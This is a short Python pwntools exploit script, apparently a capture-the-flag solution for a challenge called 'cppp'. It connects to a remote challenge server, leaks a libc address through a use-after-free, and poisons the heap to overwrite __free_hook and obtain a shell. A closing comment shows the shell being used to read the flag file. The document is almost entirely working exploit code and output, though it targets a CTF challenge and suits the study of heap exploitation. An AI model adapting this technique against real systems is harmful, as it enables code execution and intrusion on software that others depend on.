from pwn import *

#r = process("./cppp")
r = remote("cppp.pwni.ng", 7777)

def add(name, buf):
    r.sendline("1")
    print r.recvuntil("name: ")
    r.sendline(name)
    print r.recvuntil("buf: ")
    r.sendline(buf)
    print r.recvuntil(": ")

def remove(idx):
    r.sendline("2")
    print r.recvuntil(": ")
    r.sendline(str(idx))
    print r.recvuntil(": ")

print r.recvuntil("Choice: ")
add("asdf", "b"*3168)
add("asdftt", "b"*3168)
remove(0)
r.sendline("3\n0")
rv = r.recvuntil("\x7f")[-6:]
libc = u64(rv + "\x00\x00")
print "libc: " + hex(libc)
libc_base = libc - 0x3ebca0
free_hook = libc_base + 0x3ed8e8

add("a", "/bin/sh\x00")
add("b", "B"*20)
add("as", "/bin/sh\x00")
remove(1)
remove(1)
add("d", p64(free_hook))
r.sendline("1\n1")
r.sendline(p64(libc_base+0x4f440))

r.sendline("1\n")
r.sendline("asdf")
r.sendline("sh\x00")
r.interactive()

'''
$ cd /home/cppp
$ ls
cppp
flag.txt
$ cat flag.txt
PCTF{ccccccppppppppppppPPPPP+++++!}
$
'''
